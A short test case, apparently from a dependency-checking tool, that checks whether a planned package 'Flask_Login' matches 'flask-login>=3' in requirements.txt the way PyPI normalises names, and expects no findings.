  it("matches a plan's package name the way PyPI does", async () => {
    const add = [{ name: "Flask_Login", version: ">=3", ecosystem: "pypi", reason: "Needed." }];
    const findings = await findingsFor("requirements.txt", "", "flask-login>=3\n", {
      plan: { dependencies: { add } },
    });
    expect(ruleNames(findings)).toEqual([]);
  });
});
